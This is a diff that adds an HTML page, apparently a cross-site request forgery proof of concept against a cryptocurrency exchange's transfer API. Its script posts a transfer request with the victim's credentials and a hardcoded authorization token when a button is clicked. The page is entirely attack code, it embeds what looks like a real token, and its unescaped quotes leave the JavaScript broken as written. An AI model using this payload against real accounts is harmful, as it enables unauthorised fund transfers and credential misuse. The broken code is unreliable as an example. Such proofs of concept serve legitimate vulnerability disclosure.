@@ -1,0 +1,27 @@
+<html>
+
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://api.coinjar.com/v3/transfers", true);
+        xhr.setRequestHeader("Accept", "application/json, text/plain, */*");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Accept-Encoding", "gzip, deflate, br");
+        xhr.setRequestHeader("Authorization", " Token token="NcH6MSEdYssTOB2MQFeVSgGZDCWX0VJFg67qeQg8tdg"");
+        xhr.setRequestHeader("Content-Type", "application/json;charset=utf-8");
+         
+        xhr.withCredentials = true;
+        var body = "{"transfer_request":"7cb0419d-6778-47c8-8f35-153d00321ae0","quote":"96efa78c-db9f-407c-96e9-63c298b92891"}";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
